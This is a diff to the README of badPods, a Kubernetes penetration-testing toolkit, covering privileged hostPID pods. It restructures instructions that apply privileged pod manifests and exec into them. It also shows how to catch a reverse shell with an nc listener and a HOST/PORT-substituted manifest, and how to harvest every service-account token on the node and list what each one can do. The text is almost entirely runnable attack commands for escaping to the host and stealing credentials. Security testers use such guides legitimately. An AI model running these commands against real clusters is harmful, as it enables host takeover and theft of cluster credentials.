@@ -34,55 +34,26 @@ Create one or more of these resource types and exec into the pod
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
 kubectl exec -it priv-and-hostpid-exec-pod -- bash
 ```
-**Job**  
+**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**
+
+Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+
 ```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/job/priv-and-hostpid-exec-job.yaml 
-kubectl get pods | grep priv-and-hostpid-exec-job      
-kubectl exec -it priv-and-hostpid-exec-job-[ID] -- bash
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/[RESOURCE_TYPE]/priv-and-hostpid-exec-[RESOURCE_TYPE].yaml 
+kubectl get pods | grep priv-and-hostpid-exec-[RESOURCE_TYPE]      
+kubectl exec -it priv-and-hostpid-exec-[RESOURCE_TYPE]-[ID] -- bash
 ```
-**CronJob**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/cronjob/priv-and-hostpid-exec-cronjob.yaml 
-kubectl get pods | grep priv-and-hostpid-exec-cronjob      
-kubectl exec -it priv-and-hostpid-exec-cronjob-ID -- bash
-```
-**Deployment**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/deployment/priv-and-hostpid-exec-deployment.yaml 
-kubectl get pods | grep priv-and-hostpid-exec-deployment        
-kubectl exec -it priv-and-hostpid-exec-deployment-[ID] -- bash
-```
-**StatefulSet (This manifest also creates a service)**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/statefulset/priv-and-hostpid-exec-statefulset.yaml
-kubectl get pods | grep priv-and-hostpid-exec-statefulset
-kubectl exec -it priv-and-hostpid-exec-statefulset-[ID] -- bash
-```
-**ReplicaSet**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/replicaset/priv-and-hostpid-exec-replicaset.yaml
-kubectl get pods | grep priv-and-hostpid-exec-replicaset
-kubectl exec -it priv-and-hostpid-exec-replicaset-[ID] -- bash
+
+*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 
+
+To troubleshoot a case where you don't see pods, use `kubectl describe`
 
 ```
-**ReplicationController**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/replicationcontroller/priv-and-hostpid-exec-replicationcontroller.yaml
-kubectl get pods | grep priv-and-hostpid-exec-replicationcontroller
-kubectl exec -it priv-and-hostpid-exec-replicationcontroller-[ID] -- bash
-```
-**DaemonSet**  
-```bash
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/daemonset/priv-and-hostpid-exec-daemonset.yaml 
-kubectl get pods | grep priv-and-hostpid-exec-daemonset
-kubectl exec -it priv-and-hostpid-exec-daemonset-[ID] -- bash
+kubectl describe priv-exec-[RESOURCE_TYPE]
 ```
 
 ## Reverse shell pods
 Create one or more of these resources and catch the reverse shell
-
-**Generic resource type creation example**
-Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
 
 **Step 1: Set up listener**
 ```bash
@@ -90,6 +61,10 @@ nc -nvlp 3116
 ```
 
 **Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**
+
+* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
+* Replace the HOST and PORT values to point the reverse shell to your listener
+* 
 ```bash
 HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/priv-and-hostpid/[RESOURCE_TYPE]/priv-and-hostpid-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
 ```
@@ -195,7 +170,8 @@ done | sort
 ```
 
 **Run kubectl can-i --list against ALL tokens found on the node**
-Run this where you have kubectl installed
+
+*Run this where you have kubectl installed, and NOT from within the priv pod.*
 ```
 tokens=`kubectl exec -it priv-and-hostpid-exec-pod -- find /var/lib/kubelet/pods/ -name token -type l`; \
 for filename in $tokens; \
@@ -206,8 +182,18 @@ echo -n "What can I do? "; \
 kubectl --token=$tokena auth can-i --list; echo; \
 done
 ```
+This is what just happened:
+* From outside the pod, you execute `kubectl exec` to find all of the token locations on the host
+* You then iterate through the list of filenames, and
+  * Print the token location
+  * Run `kubectl auth can-i list` using each token via the `--token` command line argument. 
+* This gives you a list of the actions each token can perform cluster wide. 
+  
+The next command will do the same thing, but just in the kube-system namespace. 
 
 **Run kubectl can-i --list -n kube-system against ALL tokens found on the node**
+
+*Run this where you have kubectl installed, and NOT from within the priv pod.*
 ```
 tokens=`kubectl exec -it priv-and-hostpid-exec-pod -- find /var/lib/kubelet/pods/ -name token -type l`; \
 for filename in $tokens; \
